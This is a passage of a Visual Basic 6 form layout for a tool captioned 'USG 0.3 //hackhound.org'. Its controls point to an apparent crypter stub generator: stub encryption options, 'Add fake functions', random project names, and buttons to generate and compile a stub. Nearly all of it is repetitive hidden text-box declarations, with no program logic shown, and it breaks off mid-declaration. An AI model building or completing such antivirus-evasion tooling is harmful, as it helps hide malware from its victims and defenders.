VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "USG 0.3 //hackhound.org"
   ClientHeight    =   4650
   ClientLeft      =   7590
   ClientTop       =   5340
   ClientWidth     =   3225
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4650
   ScaleWidth      =   3225
   Begin VB.CommandButton Command5 
      Caption         =   "+"
      Height          =   255
      Left            =   2880
      TabIndex        =   247
      Top             =   2400
      Width           =   255
   End
   Begin VB.CommandButton Command4 
      Caption         =   "+"
      Height          =   255
      Left            =   2880
      TabIndex        =   246
      Top             =   1800
      Width           =   255
   End
   Begin VB.CommandButton Command3 
      Caption         =   "+"
      Height          =   255
      Left            =   2880
      TabIndex        =   245
      Top             =   1440
      Width           =   255
   End
   Begin VB.TextBox l2 
      BackColor       =   &H8000000F&
      Height          =   285
      Left            =   840
      TabIndex        =   244
      Top             =   1800
      Width           =   1935
   End
   Begin VB.TextBox l1 
      BackColor       =   &H8000000F&
      Height          =   285
      Left            =   840
      TabIndex        =   243
      Top             =   1440
      Width           =   1935
   End
   Begin VB.Frame Frame2 
      BorderStyle     =   0  'None
      Height          =   255
      Left            =   120
      TabIndex        =   236
      Top             =   3480
      Width           =   3135
      Begin VB.OptionButton Option8 
         Caption         =   "3 (hard)"
         Height          =   255
         Left            =   2280
         TabIndex        =   239
         Top             =   0
         Width           =   1095
      End
      Begin VB.OptionButton Option7 
         Caption         =   "2 (medium)"
         Height          =   255
         Left            =   1080
         TabIndex        =   238
         Top             =   0
         Width           =   1095
      End
      Begin VB.OptionButton Option6 
         Caption         =   "1 (slow)"
         Height          =   255
         Left            =   0
         TabIndex        =   237
         Top             =   0
         Width           =   1095
      End
   End
   Begin VB.TextBox a26 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   234
      Top             =   9720
      Width           =   150
   End
   Begin VB.TextBox a27 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   233
      Top             =   9720
      Width           =   150
   End
   Begin VB.TextBox a24 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   232
      Top             =   9720
      Width           =   150
   End
   Begin VB.TextBox a25 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   231
      Top             =   9720
      Width           =   150
   End
   Begin VB.TextBox a22 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   230
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a23 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   229
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a20 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   228
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a21 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   227
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a18 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   226
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a19 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   225
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a16 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   224
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a17 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   223
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a14 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   222
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a15 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   221
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox xr21 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   6240
      TabIndex        =   220
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr20 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   6000
      TabIndex        =   219
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr13 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4320
      TabIndex        =   218
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr14 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4560
      TabIndex        =   217
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr15 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4800
      TabIndex        =   216
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr16 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5040
      TabIndex        =   215
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr17 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5280
      TabIndex        =   214
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr18 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5520
      TabIndex        =   213
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr19 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5760
      TabIndex        =   212
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr3 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4560
      TabIndex        =   211
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr4 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4800
      TabIndex        =   210
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr5 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5040
      TabIndex        =   209
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr6 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5280
      TabIndex        =   208
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr7 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5520
      TabIndex        =   207
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr8 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   5760
      TabIndex        =   206
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr9 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   6000
      TabIndex        =   205
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr10 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   6240
      TabIndex        =   204
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr11 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3840
      TabIndex        =   203
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr12 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4080
      TabIndex        =   202
      Top             =   360
      Width           =   150
   End
   Begin VB.TextBox xr2 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4320
      TabIndex        =   201
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3840
      TabIndex        =   200
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox xr1 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   4080
      TabIndex        =   199
      Top             =   120
      Width           =   150
   End
   Begin VB.TextBox a13 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   198
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a12 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   197
      Top             =   9480
      Width           =   150
   End
   Begin VB.TextBox a11 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   196
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a6 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   195
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a7 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   194
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a8 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   193
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a9 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   192
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a10 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   191
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a3 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   190
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a4 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   189
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a5 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   188
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a2 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   187
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox c83 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   186
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c84 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   185
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c82 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   184
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox a1 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   183
      Top             =   9240
      Width           =   150
   End
   Begin VB.TextBox a 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   182
      Top             =   9240
      Width           =   150
   End
   Begin VB.CheckBox Check6 
      Caption         =   "Add fake functions"
      Height          =   255
      Left            =   1560
      TabIndex        =   179
      Top             =   1080
      Width           =   1695
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H8000000F&
      Height          =   285
      Left            =   2160
      TabIndex        =   178
      Top             =   2400
      Width           =   615
   End
   Begin VB.Frame Frame1 
      BorderStyle     =   0  'None
      Height          =   495
      Left            =   120
      TabIndex        =   172
      Top             =   2760
      Width           =   3015
      Begin VB.OptionButton Option9 
         Caption         =   "AES"
         Height          =   255
         Left            =   960
         TabIndex        =   240
         Top             =   240
         Width           =   615
      End
      Begin VB.OptionButton Option4 
         Caption         =   "Xor"
         Height          =   255
         Left            =   2400
         TabIndex        =   175
         Top             =   240
         Width           =   615
      End
      Begin VB.OptionButton Option5 
         Caption         =   "Rc4"
         Height          =   255
         Left            =   1680
         TabIndex        =   174
         Top             =   240
         Width           =   735
      End
      Begin VB.OptionButton Option3 
         Caption         =   "Blowfish"
         Height          =   255
         Left            =   0
         TabIndex        =   173
         Top             =   240
         Width           =   1095
      End
      Begin VB.Label Label1 
         Caption         =   "Stub Encryption"
         Height          =   255
         Left            =   0
         TabIndex        =   180
         Top             =   0
         Width           =   1575
      End
   End
   Begin VB.TextBox m74 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   171
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m73 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   170
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m69 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   169
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m70 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   168
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m71 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   167
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m72 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   166
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m60 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   165
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m61 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   164
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m62 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   163
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m63 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   162
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m64 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   161
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m65 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   160
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m66 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   159
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m67 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   158
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m68 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   157
      Top             =   9000
      Width           =   150
   End
   Begin VB.TextBox m58 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   156
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m59 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   155
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m45 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   154
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m46 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   153
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m47 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   152
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m48 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   151
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m49 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   150
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m50 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   149
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m51 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   148
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m52 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   147
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m53 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   146
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m54 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   145
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m55 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   144
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m56 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   143
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m57 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   142
      Top             =   8760
      Width           =   150
   End
   Begin VB.TextBox m30 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   141
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m31 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   140
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m32 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   139
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m33 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   138
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m34 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   137
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m35 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   136
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m36 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   135
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m37 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   134
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m38 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   133
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m39 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   132
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m40 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   131
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m41 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   130
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m42 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   129
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m43 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   128
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox m44 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   127
      Top             =   8520
      Width           =   150
   End
   Begin VB.TextBox p 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   126
      Top             =   7200
      Width           =   150
   End
   Begin VB.TextBox l 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   125
      Top             =   7200
      Width           =   150
   End
   Begin VB.TextBox k 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   124
      Top             =   7200
      Width           =   150
   End
   Begin VB.TextBox m29 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   123
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m15 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   122
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m16 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   121
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m17 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   120
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m18 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   119
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m19 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   118
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m20 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   117
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m21 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   116
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m22 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   115
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m23 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   114
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m24 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   113
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m25 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   112
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m26 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   111
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m27 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   110
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m28 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   109
      Top             =   8280
      Width           =   150
   End
   Begin VB.TextBox m14 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   108
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m13 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   107
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m2 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   106
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m3 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   105
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m4 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   104
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m5 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   103
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m6 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   102
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m7 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   101
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m8 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   100
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m9 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   99
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m10 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   98
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m11 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   97
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m12 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   96
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox m1 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   95
      Top             =   8040
      Width           =   150
   End
   Begin VB.TextBox c81 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   94
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c80 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   93
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox t26 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   92
      Top             =   7200
      Width           =   150
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Generate my stub"
      Height          =   375
      Left            =   120
      TabIndex        =   91
      Top             =   4200
      Width           =   1455
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Compile my stub"
      Height          =   375
      Left            =   1680
      TabIndex        =   90
      Top             =   4200
      Width           =   1455
   End
   Begin VB.OptionButton Option2 
      Caption         =   "Native-Code"
      Height          =   255
      Left            =   1680
      TabIndex        =   89
      Top             =   3840
      Width           =   1335
   End
   Begin VB.OptionButton Option1 
      Caption         =   "P-Code"
      Height          =   255
      Left            =   720
      TabIndex        =   88
      Top             =   3840
      Width           =   975
   End
   Begin VB.TextBox p1 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   87
      Top             =   7200
      Width           =   150
   End
   Begin VB.TextBox p2 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   86
      Top             =   7200
      Width           =   150
   End
   Begin VB.TextBox m 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   85
      Top             =   8040
      Width           =   150
   End
   Begin VB.CheckBox Check5 
      Caption         =   "Generate random project name"
      Height          =   255
      Left            =   120
      TabIndex        =   84
      Top             =   120
      Value           =   2  'Grayed
      Width           =   2655
   End
   Begin VB.TextBox c79 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   83
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c75 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   82
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c76 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   81
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c77 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   80
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c78 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   79
      Top             =   6960
      Width           =   150
   End
   Begin VB.TextBox c70 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   78
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c71 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   77
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c72 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   76
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c73 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   75
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c74 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   74
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c68 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   73
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c69 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   72
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c65 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1320
      TabIndex        =   71
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c66 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   70
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c67 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   69
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c64 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1080
      TabIndex        =   68
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c61 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   360
      TabIndex        =   67
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c62 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   600
      TabIndex        =   66
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c63 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   65
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c56 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2760
      TabIndex        =   64
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c57 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3000
      TabIndex        =   63
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c58 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3240
      TabIndex        =   62
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c59 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   3480
      TabIndex        =   61
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c60 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   120
      TabIndex        =   60
      Top             =   6720
      Width           =   150
   End
   Begin VB.TextBox c51 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1560
      TabIndex        =   59
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c52 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   1800
      TabIndex        =   58
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c53 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2040
      TabIndex        =   57
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c54 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2280
      TabIndex        =   56
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c55 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   2520
      TabIndex        =   55
      Top             =   6480
      Width           =   150
   End
   Begin VB.TextBox c48 
      BackColor       =   &H8000000F&
      Height          =   195
      Left            =   840
      TabIndex        =   54
